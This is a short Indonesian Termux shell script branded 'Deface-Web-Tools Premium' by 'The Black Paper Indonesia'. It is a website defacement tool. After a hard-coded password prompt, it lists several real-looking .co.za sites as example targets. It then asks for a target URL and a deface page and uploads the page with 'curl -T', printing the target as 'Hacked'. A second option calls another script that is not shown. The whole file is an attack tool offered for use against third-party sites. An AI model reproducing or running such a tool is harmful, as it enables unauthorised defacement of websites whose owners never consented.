green="\033[32;1m"
yellow="\033[33;1m"
indigo="\033[34;1m"
red="\033[35;1m"
purple="\033[37;1m"
cyan="\033[36;1m"
white="\033[39;1m"
pkg install curl -y
pkg install ruby -y
gem install lolcat
echo  $green
echo "The black paper.............";
sleep 0.9;
clear
echo
echo
echo
echo
echo $cyan
figlet D.W.T
echo ------------------------------
echo Nama Tools:Deface-Web-Tools Premium
echo Team:The Black Paper Indonesia
echo Tools Created By:7870a 
echo github:https://github.com/7870a
echo Versi:5.0
echo ------------------------------
echo $red
echo Tuliskan Password Anda
read p
if [ $p = "BPDWT" ]
then
clear
else
echo Password Salah
exit
fi
echo ----------------------------------------------
echo 1 Deface Biasa
echo 2 Deface Dengan SC Deface BP
echo ----------------------------------------------
echo  Jawabanmu:
read f
if [ $f = "1" ]
then
clear
fi

if [ $f = "2" ]
then 
cd tul
sh b.sh
exit
fi



clear
echo $green
echo Simpan SC Di Memory Internal Di Luar Folder
echo Contoh Target:
echo $red
echo "http://colourfactory.co.za"          
echo $cyan 
echo "http://chillibitez.co.za"
echo $red
echo "http://centraltech.co.za"
echo $cyan
echo "http://windmillsandporcupines.co.za"
echo $red
echo "http://mpark.co.za new"
echo $cyan
echo "http://ratia.co.za "
echo $green
echo eksekusi target
read -p "Target=>"  target
clear
echo Simpan SC Di Memory Internal Di Luar Folder
echo $red
read -p "Nama Script=>"  script
echo $cyan
echo loading..
cd /sdcard
curl -T $script $target
echo $red
echo [$target~Hacked]
echo terimakasih $ta telah menggunakan tools ini 
